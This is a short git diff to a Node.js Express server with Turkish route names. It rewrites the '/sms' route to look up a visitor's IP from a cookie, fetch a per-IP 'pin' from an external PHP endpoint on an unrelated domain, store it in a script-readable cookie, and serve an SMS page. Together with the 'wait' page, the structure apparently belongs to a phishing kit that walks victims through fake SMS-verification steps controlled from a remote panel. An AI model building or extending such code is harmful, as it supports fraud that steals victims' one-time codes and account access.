@@ -31,8 +31,32 @@ app.get('/bekle', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
 });
 
-app.get('/sms', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'sms.html'));
+app.get('/sms', async (req, res) => {
+  try {
+    
+    const ip = req.cookies.ip;
+
+    if (!ip) {
+      return res.status(400).send('IP adresi cookie olarak bulunamadı.');
+    }
+
+    // API isteği yap
+    const apiUrl = `https://hakikicelikhantutunu.com/dmn/pin.php?ip=${encodeURIComponent(ip)}`;
+    const response = await axios.get(apiUrl);
+
+    if (!response.data) {
+      throw new Error('API\'den geçersiz yanıt');
+    }
+
+    // API yanıtını cookie olarak kaydet
+    res.cookie('pin', response.data.pin, { httpOnly: false });
+
+    // sms.html dosyasını gönder
+    res.sendFile(path.join(__dirname, 'public', 'sms.html'));
+  } catch (error) {
+    console.error('API isteği hatası:', error);
+    res.status(500).json({ error: error.message });
+  }
 });
 
 app.post('/online-api', async (req, res) => {
